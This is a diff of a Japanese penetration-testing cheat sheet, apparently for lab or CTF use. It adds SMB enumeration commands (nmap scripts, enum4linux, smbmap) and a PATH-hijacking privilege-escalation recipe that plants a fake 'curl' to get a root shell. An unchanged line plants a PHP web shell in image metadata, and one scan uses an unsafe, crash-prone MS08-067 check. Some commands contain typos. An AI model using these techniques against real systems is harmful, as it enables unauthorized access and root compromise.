@@ -547,7 +547,7 @@ exiftool -Comment=’<?php echo “<pre>”; system($_GET[‘cmd’]); ?>’ ima
 ```
 
 ### steghide
-・ステガノグラフィー
+ステガノグラフィー
 ```
 steghide extract -sf image.jpg
 ```
@@ -587,6 +587,9 @@ kali@kali:~$ nmap -sV -p 111 --script=rpcinfo 10.10.10.1
 
 NFSが動作していることが分かった場合/usr/share/nmap/scriptsにあるNSEスクリプトを使用して、サービスの列挙や追加サービスの発見を行うことができる。「*」を使用することで、まとめて使用することができる。
 ```
+kali@kali:~$ sudo nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.10.1
+```
+```
 kali@kali:~$ ls -1 /usr/share/nmap/scripts/nfs*
 /usr/share/nmap/scripts/nfs-ls.nse
 /usr/share/nmap/scripts/nfs-showmount.nse
@@ -606,6 +609,32 @@ jenny joe45 john marcus ryuu
 ```
 
 ## SMB(139,445)
+### SMBの列挙(Nmap NSE Scripts)
+共有とユーザー名の列挙
+```
+sudo nmap -p 445 --script=smb-enum-shares,smb-enum-users 10.10.195.198
+```
+SMBによるOSの検出や列挙(smb-os-discovery):
+```
+kali@kali:~$ nmap -v -p 139, 445 --script=smb-os-discovery 10.11.1.227
+```
+SMBプロトコルの既知の脆弱性をチェックする場合:  
+(unsafe=1にした場合、脆弱なシステムをクラッシュさせてしまう可能性があるので、本番システムをスキャンする場合は注意)
+```
+kali@kali:~$ nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 10.10.10.1
+```
+
+### enum4linux
+```
+enum4linx 10.10.10.1
+```
+```
+enum4linux -S -U -o 10.10.10.1
+```
+- -S...共有リスト取得
+- -U...ユーザリスト取得
+- -o...OS情報取得
+
 ### smbclient
 匿名ログインが有効になっているかの確認。
 ```
@@ -613,6 +642,28 @@ smbclient -L 10.10.10.1
 smbclient //10.10.10.1/tmp
 smbclient //10.10.10.1/tmp -U <user>
 ```
+
+### smbmap
+ドメイン全体のsamba共有ドライブを列挙するために使用。
+```
+smbmap -H 10.10.10.1
+smbmap -u <user> -p <password> -H 10.10.10.1
+smbmap -H 10.10.10.1 -d <domain> -u <user> -p <password>
+```
+
+### smbコマンド
+|  コマンド  |  説明  |
+| ---- | ---- |
+|  dir  |  リスト表示  |
+|  exit |  終了  |
+|  get  |  取得  |
+|  mget |  まとめて取得  |
+|  mkdir  |  ディレクトリ作成  |
+|  put  |  転送  |
+|  mput  |  まとめて転送  |
+|  lcd  |  ローカル側のディレクトリを移動  |
+|  mdir  |  ディレクトリ削除  |
+
 
 ### impacket
 ネットワークプロトコルを操作するためにPythonクラスのコレクション。  
@@ -656,35 +707,6 @@ nmap --script smb-* -p 139,445, 10.10.10.1
 nmap --script smb-enum-* -p 139,445, 10.10.10.1
 ```
 
-#### Nmap NSE ScriptsによるSMBの列挙
-Nmap NES Scriptsのディレクトリ(SMB):
-```
-/usr/share/nmap/scripts
-```
-SMBによるOSの検出や列挙(smb-os-discovery):
-```
-kali@kali:~$ nmap -v -p 139, 445 --script=smb-os-discovery 10.11.1.227
-```
-SMBプロトコルの既知の脆弱性をチェックする場合:  
-(unsafe=1にした場合、脆弱なシステムをクラッシュさせてしまう可能性があるので、本番システムをスキャンする場合は注意)
-```
-kali@kali:~$ nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 10.10.10.1
-```
-
-### smbmap
-ドメイン全体のsamba共有ドライブを列挙するために使用。
-```
-smbmap -u <user> -p <password> -H 10.10.10.1
-smbmap -H 10.10.10.1 -d <domain> -u <user> -p <password>
-```
-
-### enum4linux
-WindowsおよびSambaホストからのデータを列挙するためのツール。
-```
-enum4linux -U -o <target ip>
-```
-- -U...ユーザリスト取得
-- -o...OS情報取得
 
 ### NetBIOS(139)
 NetBIOSはローカルネットワーク上のコンピュータが相互に通信できるようにするセッション層のプロトコルである。  
@@ -1353,10 +1375,19 @@ ps auxコマンドでは確認できない定期的にUID=0(root権限)で実行
 
 ### その他テクニック
 #### Path Injection
-sudo・root権限で実行可能なスクリプト内にgzipやpsコマンドが記述されている場合、自分が用意したreverse shellなどを実行させるようにパスを書き換える。  
+sudo・root権限で実行可能なスクリプト内(SUIDバイナリ)にcurlやgzipやpsコマンドなどがフルパスなしで記述され実行されている場合、自分が用意したコマンド(/bin/shやreverse shellスクリプト)などを実行させるようにパスを書き換える。  
 スクリプト実行時にroot権限でreverse shellが得られる。
-
 ```
+# Get a shell
+echo$PATH
+cd /tmp
+echo /bin/sh > curl
+chmod 777
+export PATH=/tmp:$PATH
+/usr/bin/menu # SUIDバイナリ
+```
+```
+# reverse shell
 echo $PATH
 cd /tmp
 # gzipの部分はインジェクションさせたいコマンド
@@ -1367,7 +1398,6 @@ export PATH=/tmp:$PATH
 ./backup.sh
 whoami → root
 ```
-
 
 #### ユーザを指定してコマンドを実行
 ```
